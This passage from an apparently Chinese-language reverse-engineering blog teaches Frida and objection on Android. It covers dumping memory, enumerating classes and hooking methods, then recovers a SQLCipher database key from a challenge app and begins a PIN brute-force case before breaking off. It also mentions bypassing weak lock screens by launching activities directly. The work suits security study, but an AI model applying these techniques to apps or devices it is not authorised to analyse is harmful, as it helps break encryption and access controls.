b&#39;YWRtaW46MTIzNDU2Jw&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://github.com/Mind0xP/Frida-Python-Binding" target="_blank" rel="noopener">https://github.com/Mind0xP/Frida-Python-Binding</a></p><h3 id="API-List"><a href="#API-List" class="headerlink" title="API List"></a>API List</h3><ul><li><p><code>Java.choose(className: string, callbacks: Java.ChooseCallbacks): void</code><br>通过扫描Java VM的堆来枚举className类的live instance。</p></li><li><p><code>Java.use(className: string): Java.Wrapper&lt;{}&gt;</code><br>动态为className生成JavaScript Wrapper，可以通过调用<code>$new()</code>来调用构造函数来实例化对象。<br>在实例上调用<code>$dispose()</code>以对其进行显式清理，或者等待JavaScript对象被gc。 </p></li><li><p><code>Java.perform(fn: () =&gt; void): void</code><br>Function to run while attached to the VM.<br>Ensures that the current thread is attached to the VM and calls fn. (This isn’t necessary in callbacks from Java.)<br>Will defer calling fn if the app’s class loader is not available yet. Use Java.performNow() if access to the app’s classes is not needed.</p></li><li><p><code>send(message: any, data?: ArrayBuffer | number[]): void</code><br>任何JSON可序列化的值。<br>将JSON序列化后的message发送到您的基于Frida的应用程序，并包含(可选)一些原始二进制数据。<br>The latter is useful if you e.g. dumped some memory using NativePointer#readByteArray().</p></li><li><p><code>recv(callback: MessageCallback): MessageRecvOperation</code><br>Requests callback to be called on the next message received from your Frida-based application.<br>This will only give you one message, so you need to call recv() again to receive the next one.</p></li><li><p><code>wait(): void</code><br>堵塞，直到message已经receive并且callback已经执行完毕并返回</p></li></ul><h2 id="Frida动静态结合分析"><a href="#Frida动静态结合分析" class="headerlink" title="Frida动静态结合分析"></a>Frida动静态结合分析</h2><h3 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h3><ul><li>参考这篇文章<br><a href="https://www.anquanke.com/post/id/197657" target="_blank" rel="noopener">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></li><li>objection<br><a href="https://pypi.org/project/objection/" target="_blank" rel="noopener">https://pypi.org/project/objection/</a></li></ul><h4 id="objection启动并注入内存"><a href="#objection启动并注入内存" class="headerlink" title="objection启动并注入内存"></a>objection启动并注入内存</h4><p><code>objection -d -g package_name explore</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -d -g com.android.settings explore</span><br><span class="line">[debug] Agent path is: &#x2F;Users&#x2F;sakura&#x2F;.pyenv&#x2F;versions&#x2F;3.7.7&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;objection&#x2F;agent.js</span><br><span class="line">[debug] Injecting agent...</span><br><span class="line">Using USB device &#96;Google Pixel&#96;</span><br><span class="line">[debug] Attempting to attach to process: &#96;com.android.settings&#96;</span><br><span class="line">[debug] Process attached!</span><br><span class="line">Agent injected and responds ok!</span><br><span class="line"></span><br><span class="line">     _   _         _   _</span><br><span class="line"> ___| |_|_|___ ___| |_|_|___ ___</span><br><span class="line">| . | . | | -_|  _|  _| | . |   |</span><br><span class="line">|___|___| |___|___|_| |_|___|_|_|</span><br><span class="line">      |___|(object)inject(ion) v1.8.4</span><br><span class="line"></span><br><span class="line">     Runtime Mobile Exploration</span><br><span class="line">        by: @leonjza from @sensepost</span><br><span class="line"></span><br><span class="line">[tab] for command suggestions</span><br><span class="line">com.android.settings on (google: 8.1.0) [usb] #</span><br></pre></td></tr></table></figure><h4 id="objection-memory"><a href="#objection-memory" class="headerlink" title="objection memory"></a>objection memory</h4><h5 id="查看内存中加载的module-memory-list-modules"><a href="#查看内存中加载的module-memory-list-modules" class="headerlink" title="查看内存中加载的module memory list modules"></a>查看内存中加载的module <code>memory list modules</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # memory list modules</span><br><span class="line">Save the output by adding &#96;--json modules.json&#96; to this command</span><br><span class="line">Name                                             Base          Size                  Path</span><br><span class="line">-----------------------------------------------  ------------  --------------------  ---------------------------------------------------------------</span><br><span class="line">app_process64                                    0x64ce143000  32768 (32.0 KiB)      &#x2F;system&#x2F;bin&#x2F;app_process64</span><br><span class="line">libandroid_runtime.so                            0x7a90bc3000  1990656 (1.9 MiB)     &#x2F;system&#x2F;lib64&#x2F;libandroid_runtime.so</span><br><span class="line">libbinder.so                                     0x7a9379f000  557056 (544.0 KiB)    &#x2F;system&#x2F;lib64&#x2F;libbinder.so</span><br></pre></td></tr></table></figure><h5 id="查看库的导出函数-memory-list-exports-libssl-so"><a href="#查看库的导出函数-memory-list-exports-libssl-so" class="headerlink" title="查看库的导出函数 memory list exports libssl.so"></a>查看库的导出函数 <code>memory list exports libssl.so</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # memory list exports libssl.so</span><br><span class="line">Save the output by adding &#96;--json exports.json&#96; to this command</span><br><span class="line">Type      Name                                                   Address</span><br><span class="line">--------  -----------------------------------------------------  ------------</span><br><span class="line">function  SSL_use_certificate_ASN1                               0x7c8ff006f8</span><br><span class="line">function  SSL_CTX_set_dos_protection_cb                          0x7c8ff077b8</span><br><span class="line">function  SSL_SESSION_set_ex_data                                0x7c8ff098f4</span><br><span class="line">function  SSL_CTX_set_session_psk_dhe_timeout                    0x7c8ff0a754</span><br><span class="line">function  SSL_CTX_sess_accept                                    0x7c8ff063b8</span><br><span class="line">function  SSL_select_next_proto                                  0x7c8ff06a74</span><br></pre></td></tr></table></figure><h5 id="dump内存空间"><a href="#dump内存空间" class="headerlink" title="dump内存空间"></a>dump内存空间</h5><ul><li><code>memory dump all 文件名</code></li><li><code>memory dump from_base 起始地址 字节数 文件名</code><h5 id="搜索内存空间"><a href="#搜索内存空间" class="headerlink" title="搜索内存空间"></a>搜索内存空间</h5><code>Usage: memory search &quot;&lt;pattern eg: 41 41 41 ?? 41&gt;&quot; (--string) (--offsets-only)</code></li></ul><h4 id="objection-android"><a href="#objection-android" class="headerlink" title="objection android"></a>objection android</h4><h5 id="内存堆搜索实例-android-heap-search-instances-类名"><a href="#内存堆搜索实例-android-heap-search-instances-类名" class="headerlink" title="内存堆搜索实例 android heap search instances 类名"></a>内存堆搜索实例 <code>android heap search instances 类名</code></h5><p>在堆上搜索类的实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -g myapplication.example.com.frida_demo explore</span><br><span class="line">Using USB device &#96;Google Pixel&#96;</span><br><span class="line">Agent injected and responds ok!</span><br><span class="line"></span><br><span class="line">[usb] # android heap search instances myapplication.example.com.frida_demo</span><br><span class="line">.MainActivity</span><br><span class="line">Class instance enumeration complete for myapplication.example.com.frida_demo.MainActivity</span><br><span class="line">Handle    Class                                              toString()</span><br><span class="line">--------  -------------------------------------------------  ---------------------------------------------------------</span><br><span class="line">0x2102    myapplication.example.com.frida_demo.MainActivity  myapplication.example.com.frida_demo.MainActivity@5b1b0af</span><br></pre></td></tr></table></figure><h5 id="调用实例的方法-android-heap-execute-实例ID-实例方法"><a href="#调用实例的方法-android-heap-execute-实例ID-实例方法" class="headerlink" title="调用实例的方法 android heap execute 实例ID 实例方法"></a>调用实例的方法 <code>android heap execute 实例ID 实例方法</code></h5><h5 id="查看当前可用的activity或者service-android-hooking-list-activities-services"><a href="#查看当前可用的activity或者service-android-hooking-list-activities-services" class="headerlink" title="查看当前可用的activity或者service android hooking list activities/services"></a>查看当前可用的activity或者service <code>android hooking list activities/services</code></h5><h5 id="直接启动activity或者服务-android-intent-launch-activity-launch-service-activity-服务"><a href="#直接启动activity或者服务-android-intent-launch-activity-launch-service-activity-服务" class="headerlink" title="直接启动activity或者服务 android intent launch_activity/launch_service activity/服务"></a>直接启动activity或者服务 <code>android intent launch_activity/launch_service activity/服务</code></h5><p><code>android intent launch_activity com.android.settings.DisplaySettings</code><br>这个命令比较有趣的是用在如果有些设计的不好，可能就直接绕过了密码锁屏等直接进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking list services</span><br><span class="line">com.android.settings.SettingsDumpService</span><br><span class="line">com.android.settings.TetherService</span><br><span class="line">com.android.settings.bluetooth.BluetoothPairingService</span><br></pre></td></tr></table></figure><h5 id="列出内存中所有的类-android-hooking-list-classes"><a href="#列出内存中所有的类-android-hooking-list-classes" class="headerlink" title="列出内存中所有的类 android hooking list classes"></a>列出内存中所有的类 <code>android hooking list classes</code></h5><h5 id="在内存中所有已加载的类中搜索包含特定关键词的类。-android-hooking-search-classes-display"><a href="#在内存中所有已加载的类中搜索包含特定关键词的类。-android-hooking-search-classes-display" class="headerlink" title="在内存中所有已加载的类中搜索包含特定关键词的类。 android hooking search classes display"></a>在内存中所有已加载的类中搜索包含特定关键词的类。 <code>android hooking search classes display</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking search classes display</span><br><span class="line">[Landroid.icu.text.DisplayContext$Type;</span><br><span class="line">[Landroid.icu.text.DisplayContext;</span><br><span class="line">[Landroid.view.Display$Mode;</span><br><span class="line">android.hardware.display.DisplayManager</span><br><span class="line">android.hardware.display.DisplayManager$DisplayListener</span><br><span class="line">android.hardware.display.DisplayManagerGlobal</span><br></pre></td></tr></table></figure><h5 id="内存中搜索指定类的所有方法-android-hooking-list-class-methods-类名"><a href="#内存中搜索指定类的所有方法-android-hooking-list-class-methods-类名" class="headerlink" title="内存中搜索指定类的所有方法 android hooking list class_methods 类名"></a>内存中搜索指定类的所有方法 <code>android hooking list class_methods 类名</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking list class_methods java.nio.charset.Charset</span><br><span class="line">private static java.nio.charset.Charset java.nio.charset.Charset.lookup(java.lang.String)</span><br><span class="line">private static java.nio.charset.Charset java.nio.charset.Charset.lookup2(java.lang.String)</span><br><span class="line">private static java.nio.charset.Charset java.nio.charset.Charset.lookupViaProviders(java.lang.String)</span><br></pre></td></tr></table></figure><h5 id="在内存中所有已加载的类的方法中搜索包含特定关键词的方法-android-hooking-search-methods-display"><a href="#在内存中所有已加载的类的方法中搜索包含特定关键词的方法-android-hooking-search-methods-display" class="headerlink" title="在内存中所有已加载的类的方法中搜索包含特定关键词的方法 android hooking search methods display"></a>在内存中所有已加载的类的方法中搜索包含特定关键词的方法 <code>android hooking search methods display</code></h5><p>知道名字开始在内存里搜就很有用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # android hooking search methods display</span><br><span class="line">Warning, searching all classes may take some time and in some cases, crash the target application.</span><br><span class="line">Continue? [y&#x2F;N]: y</span><br><span class="line">Found 5529 classes, searching methods (this may take some time)...</span><br><span class="line">android.app.ActionBar.getDisplayOptions</span><br><span class="line">android.app.ActionBar.setDefaultDisplayHomeAsUpEnabled</span><br><span class="line">android.app.ActionBar.setDisplayHomeAsUpEnabled</span><br></pre></td></tr></table></figure><h5 id="hook类的方法（hook类里的所有方法-具体某个方法）"><a href="#hook类的方法（hook类里的所有方法-具体某个方法）" class="headerlink" title="hook类的方法（hook类里的所有方法/具体某个方法）"></a>hook类的方法（hook类里的所有方法/具体某个方法）</h5><ul><li><code>android hooking watch class 类名</code><br>这样就可以hook这个类里面的所有方法，每次调用都会被log出来。</li><li><code>android hooking watch class 类名 --dump-args --dump-backtrace --dump-return</code><br>在上面的基础上，额外dump参数，栈回溯，返回值 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class xxx.MainActivity --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure></li><li><code>android hooking watch class_method 方法名</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;可以直接hook到所有重载</span><br><span class="line">android hooking watch class_method xxx.MainActivity.fun --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><h4 id="grep-trick和文件保存"><a href="#grep-trick和文件保存" class="headerlink" title="grep trick和文件保存"></a>grep trick和文件保存</h4>objection log默认是不能用grep过滤的，但是可以通过<code>objection run xxx | grep yyy的</code>方式，从终端通过管道来过滤。<br>用法如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~$ objection -g com.android.settings run memory list modules | grep libc</span><br><span class="line">Warning: Output is not to a terminal (fd&#x3D;1).</span><br><span class="line">libcutils.so                                     0x7a94a1c000  81920 (80.0 KiB)      &#x2F;system&#x2F;lib64&#x2F;libcutils.so</span><br><span class="line">libc++.so                                        0x7a9114e000  983040 (960.0 KiB)    &#x2F;system&#x2F;lib64&#x2F;libc++.so</span><br><span class="line">libc.so                                          0x7a9249d000  892928 (872.0 KiB)    &#x2F;system&#x2F;lib64&#x2F;libc.so</span><br><span class="line">libcrypto.so                                     0x7a92283000  1155072 (1.1 MiB)     &#x2F;system&#x2F;lib64&#x2F;libcrypto.so</span><br></pre></td></tr></table></figure>有的命令后面可以通过<code>--json logfile</code>来直接保存结果到文件里。<br>有的可以通过查看<code>.objection</code>文件里的输出log来查看结果。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;.objection$ cat *log | grep -i display</span><br><span class="line">android.hardware.display.DisplayManager</span><br><span class="line">android.hardware.display.DisplayManager$DisplayListener</span><br><span class="line">android.hardware.display.DisplayManagerGlobal</span><br></pre></td></tr></table></figure></li></ul><h3 id="案例学习"><a href="#案例学习" class="headerlink" title="案例学习"></a>案例学习</h3><h4 id="案例学习case1-《仿VX数据库原型取证逆向分析》"><a href="#案例学习case1-《仿VX数据库原型取证逆向分析》" class="headerlink" title="案例学习case1:《仿VX数据库原型取证逆向分析》"></a>案例学习case1:《仿VX数据库原型取证逆向分析》</h4><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1082706" target="_blank" rel="noopener">附件链接</a><br><a href="https://github.com/nelenkov/android-backup-extractor" target="_blank" rel="noopener">android-backup-extractor工具链接</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-100849.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn$ java -version</span><br><span class="line">java version &quot;1.8.0_141&quot;</span><br><span class="line"></span><br><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn$ java -jar abe-all.jar unpack 1.ab 1.tar</span><br><span class="line">0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%</span><br><span class="line">9097216 bytes written to 1.tar.</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida_learn&#x2F;apps&#x2F;com.example.yaphetshan.tencentwelcome$ ls</span><br><span class="line">Encryto.db _manifest  a          db</span><br></pre></td></tr></table></figure><p>装个夜神模拟器玩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:&#x2F;Applications&#x2F;NoxAppPlayer.app&#x2F;Contents&#x2F;MacOS$ .&#x2F;adb connect 127.0.0.1:62001</span><br><span class="line">* daemon not running. starting it now on port 5037 *</span><br><span class="line">adb E  5139 141210 usb_osx.cpp:138] Unable to create an interface plug-in (e00002be)</span><br><span class="line">* daemon started successfully *</span><br><span class="line">connected to 127.0.0.1:62001</span><br><span class="line">sakura@sakuradeMacBook-Pro:&#x2F;Applications&#x2F;NoxAppPlayer.app&#x2F;Contents&#x2F;MacOS$ .&#x2F;adb shell</span><br><span class="line">dream2qltechn:&#x2F; # whoami</span><br><span class="line">root</span><br><span class="line">dream2qltechn:&#x2F; # uname -a</span><br><span class="line">Linux localhost 4.0.9+ #222 SMP PREEMPT Sat Mar 14 18:24:36 HKT 2020 i686</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-120749.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-121130.png" alt=""></p><p>肯定还是先定位目标字符串<code>Wait a Minute,What was happend?</code><br>jadx搜索字符串<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-121255.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-121403.png" alt=""></p><p>重点在a()代码里，其实是根据明文的name和password，然后<code>aVar.a(a2 + aVar.b(a2, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)</code>再做一遍复杂的计算并截取7位当做密码，传入getWritableDatabase去解密demo.db数据库。</p><p>所以我们hook一下getWritableDatabase即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br><span class="line">...</span><br><span class="line">5662  com.example.yaphetshan.tencentwelcome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objection -d -g com.example.yaphetshan.tencentwelcome explore</span><br></pre></td></tr></table></figure><p>看一下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package net.sqlcipher.database;</span><br><span class="line">...</span><br><span class="line">public abstract class SQLiteOpenHelper &#123;</span><br><span class="line">    ...</span><br><span class="line">    public synchronized SQLiteDatabase getWritableDatabase(char[] cArr) &#123;</span><br></pre></td></tr></table></figure><p>也可以objection search一下这个method</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...mple.yaphetshan.tencentwelcome on (samsung: 7.1.2) [usb] # android hooking search methods getWritableDatabase</span><br><span class="line">Warning, searching all classes may take some time and in some cases, crash the target application.</span><br><span class="line">Continue? [y&#x2F;N]: y</span><br><span class="line">Found 4650 classes, searching methods (this may take some time)...</span><br><span class="line"></span><br><span class="line">android.database.sqlite.SQLiteOpenHelper.getWritableDatabase</span><br><span class="line">...</span><br><span class="line">net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase</span><br></pre></td></tr></table></figure><p>hook一下这个method</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[usb] # android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Attempting to watch class \u001b[32mnet.sqlcipher.database.SQLiteOpenHelper\u001b[39m and method \u001b[32mgetWritableDatabase\u001b[39m.&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Attempting to watch class net.sqlcipher.database.SQLiteOpenHelper and method getWritableDatabase.</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Hooking \u001b[32mnet.sqlcipher.database.SQLiteOpenHelper\u001b[39m.\u001b[92mgetWritableDatabase\u001b[39m(\u001b[31mjava.lang.String\u001b[39m)&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Hooking net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(java.lang.String)</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Hooking \u001b[32mnet.sqlcipher.database.SQLiteOpenHelper\u001b[39m.\u001b[92mgetWritableDatabase\u001b[39m(\u001b[31m[C\u001b[39m)&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Hooking net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase([C)</span><br><span class="line">- [incoming message] ------------------</span><br><span class="line">&#123;</span><br><span class="line">  &quot;payload&quot;: &quot;Registering job \u001b[94mjytq1qeyllq\u001b[39m. Type: \u001b[92mwatch-method for: net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase\u001b[39m&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;send&quot;</span><br><span class="line">&#125;</span><br><span class="line">- [.&#x2F;incoming message] ----------------</span><br><span class="line">(agent) Registering job jytq1qeyllq. Type: watch-method for: net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase</span><br><span class="line">...mple.yaphetshan.tencentwelcome on (samsung: 7.1.2) [usb] #</span><br></pre></td></tr></table></figure><p>hook好之后再打开这个apk<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-125545.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-125604.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(agent) [1v488x28gcs] Called net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(java.lang.String)</span><br><span class="line">...</span><br><span class="line">(agent) [1v488x28gcs] Backtrace:</span><br><span class="line">net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(Native Method)</span><br><span class="line">com.example.yaphetshan.tencentwelcome.MainActivity.a(MainActivity.java:55)</span><br><span class="line">com.example.yaphetshan.tencentwelcome.MainActivity.onCreate(MainActivity.java:42)</span><br><span class="line">android.app.Activity.performCreate(Activity.java:6692)</span><br><span class="line">...</span><br><span class="line">(agent) [1v488x28gcs] Arguments net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(ae56f99)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...mple.yaphetshan.tencentwelcome on (samsung: 7.1.2) [usb] # jobs list</span><br><span class="line">Job ID         Hooks  Type</span><br><span class="line">-----------  -------  -----------------------------------------------------------------------------</span><br><span class="line">1v488x28gcs        2  watch-method for: net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase</span><br></pre></td></tr></table></figure><p>找到参数<code>ae56f99</code><br>剩下的就是用这个密码去打开加密的db。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-125824.png" alt=""><br>然后base64解密一下就好了。</p><p>还有一种策略是主动调用,基于数据流的主动调用分析是非常有意思的。<br>即自己去调用a函数以触发getWritableDatabase的数据库解密。<br>先寻找a所在类的实例，然后hook getWritableDatabase，最终主动调用a。<br>这里幸运的是a没有什么奇奇怪怪的参数需要我们传入，主动调用这种策略在循环注册等地方可能就会有需求8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> [usb] # android heap search instances com.example.yaphetshan.tencentwelcome.MainActivity</span><br><span class="line">Class instance enumeration complete for com.example.yaphetshan.tencentwelcome.MainActivity</span><br><span class="line">Handle    Class                                               toString()</span><br><span class="line">--------  --------------------------------------------------  ----------------------------------------------------------</span><br><span class="line">0x20078a  com.example.yaphetshan.tencentwelcome.MainActivity  com.example.yaphetshan.tencentwelcome.MainActivity@1528f80</span><br><span class="line"></span><br><span class="line"> [usb] # android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return</span><br><span class="line"></span><br><span class="line">[usb] # android heap execute 0x20078a a</span><br><span class="line"></span><br><span class="line">(agent) [taupgwkum4h] Arguments net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase(ae56f99)</span><br></pre></td></tr></table></figure><h4 id="案例学习case2-主动调用爆破密码"><a href="#案例学习case2-主动调用爆破密码" class="headerlink" title="案例学习case2:主动调用爆破密码"></a>案例学习case2:主动调用爆破密码</h4><p><a href="https://bbs.pediy.com/thread-257745.htm" target="_blank" rel="noopener">附件链接</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-27-132438.png" alt=""></p><p>因为直接找<code>Unfortunately,note the right PIN :(</code>找不到，可能是把字符串藏在什么资源文件里了。<br>review代码之后找到校验的核心函数，逻辑就是将input编码一下之后和密码比较，这肯定是什么不可逆的加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">verifyPassword</span><span class="params">(Context context, String input)</span> </span>&#123;</span><br><span class="line">    <span 